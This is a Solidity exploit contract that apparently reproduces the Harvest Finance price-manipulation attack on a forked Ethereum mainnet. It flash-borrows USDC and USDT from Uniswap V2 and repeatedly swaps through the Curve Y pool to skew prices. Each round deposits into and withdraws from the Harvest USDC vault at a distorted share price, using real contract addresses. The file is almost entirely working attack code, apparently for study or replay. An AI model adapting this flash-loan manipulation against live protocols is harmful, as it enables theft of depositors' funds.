// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IcurveYSwap {
    function exchange_underlying(int128 i, int128 j, uint256 dx, uint256 min_dy) external returns (uint256);
}

interface IHarvestUsdcVault {
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
}

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

interface IUSDT is IERC20 {}

contract Exploit {
    CheatCodes internal cheats;
    IUniswapV2Pair internal usdcPair;
    IUniswapV2Pair internal usdtPair;
    IcurveYSwap internal curveYSwap;
    IHarvestUsdcVault internal harvest;
    IUSDT internal usdt;
    IERC20 internal usdc;
    IERC20 internal yusdc;
    IERC20 internal yusdt;
    IERC20 internal fusdt;
    IERC20 internal fusdc;

    uint256 internal usdcLoan;
    uint256 internal usdcRepayment;
    uint256 internal usdtLoan;
    uint256 internal usdtRepayment;

    function run() external returns (uint256) {
        cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
        cheats.createSelectFork("mainnet", 11129473);
        usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
        usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
        curveYSwap = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
        harvest = IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
        usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
        usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        yusdc = IERC20(0xd6aD7a6750A7593E092a9B218d66C0A814a3436e);
        yusdt = IERC20(0x83f798e925BcD4017Eb265844FDDAbb448f1707D);
        fusdt = IERC20(0x053c80eA73Dc6941F518a68E2FC52Ac45BDE7c9C);
        fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);
        usdcLoan = 150_000_000 * 10 ** 6;
        usdcRepayment = (usdcLoan * 100_301) / 100_000;
        usdtLoan = 17_300_000 * 10 ** 6;
        usdtRepayment = (usdtLoan * 100_301) / 100_000;

        usdt.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(harvest), type(uint256).max);
        usdt.approve(address(usdtPair), type(uint256).max);
        usdc.approve(address(usdcPair), type(uint256).max);

        uint256 initialBalance = usdc.balanceOf(address(this));
        usdcPair.swap(usdcLoan, 0, address(this), "0x");
        uint256 finalBalance = usdc.balanceOf(address(this));
        return finalBalance - initialBalance;
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == address(usdcPair)) {
            usdtPair.swap(0, usdtLoan, address(this), "0x");
            usdc.transfer(address(usdcPair), usdcRepayment);
        }
        if (msg.sender == address(usdtPair)) {
            for (uint256 i = 0; i < 6; i++) {
                theSwap(i);
            }
            usdt.transfer(msg.sender, usdtRepayment);
        }
    }

    function theSwap(uint256) internal {
        curveYSwap.exchange_underlying(int128(2), int128(1), 17_200_000 * 10 ** 6, 17_000_000 * 10 ** 6);
        harvest.deposit(149_000_000_000_000);
        curveYSwap.exchange_underlying(int128(1), int128(2), 17_310_000 * 10 ** 6, 17_000_000 * 10 ** 6);
        harvest.withdraw(fusdc.balanceOf(address(this)));
    }

    receive() external payable {}
}
